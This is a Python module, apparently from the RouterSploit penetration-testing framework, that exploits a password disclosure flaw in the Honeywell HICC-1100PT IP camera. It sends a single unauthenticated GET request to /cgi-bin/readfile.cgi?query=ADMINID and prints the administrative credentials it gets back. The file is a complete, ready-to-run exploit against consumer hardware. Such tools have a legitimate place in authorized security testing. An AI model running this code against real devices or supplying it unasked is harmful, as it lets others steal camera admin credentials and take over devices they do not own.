from routersploit import (
    exploits,
    print_error,
    print_info,
    print_success,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Honeywell IP-Camera HICC-1100PT Password Dislosure vulnerability.
    If target is vulnerable it is possible to read administative credentials.
    """
    __info__ = {
        'name': 'Honeywell IP-Camera HICC-1100PT Password Disclosure',
        'description': 'Module exploits Honeywell IP-Camera HICC-1100PT Password Dislosure vulnerability. If target is vulnerable '
                       'it is possible to read administrative credentials',
        'authors': [
            'Yakir Wizman',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/40261/',
        ],
        'devices': [
            'Honeywell IP-Camera HICC-1100PT',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def __init__(self):
        self.content = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_info(self.content)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/cgi-bin/readfile.cgi?query=ADMINID".format(self.target, self.port)
        response = http_request(method="GET", url=url)

        if response is not None and "Adm_ID" in response.text:
            self.content = response.text
            return True  # target is vulnerable

        return False  # target is not vulnerable
